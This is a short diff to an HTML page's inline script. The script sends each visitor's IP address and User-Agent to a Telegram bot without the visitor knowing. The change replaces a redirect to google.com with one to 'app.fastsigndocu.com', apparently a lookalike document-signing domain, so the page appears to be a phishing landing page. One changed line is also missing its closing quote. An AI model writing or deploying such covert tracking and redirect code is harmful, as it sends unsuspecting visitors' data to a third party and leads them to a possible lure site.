@@ -14,12 +14,12 @@
                 const message = `👤 Новый посетитель:\nIP: ${ip}\nUser-Agent: ${userAgent}`;
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                     .then(() => {
-                        window.location.href = "https://google.com";
+                        window.location.href = "https://app.fastsigndocu.com/";
                     });
             })
             .catch(err => {
-                console.error('Ошибка получения IP:', err);
-                window.location.href = "https://google.com";
+                console.error('error:', err);
+                window.location.href = "https://app.fastsigndocu.com/;
             });
     </script>
 </head>
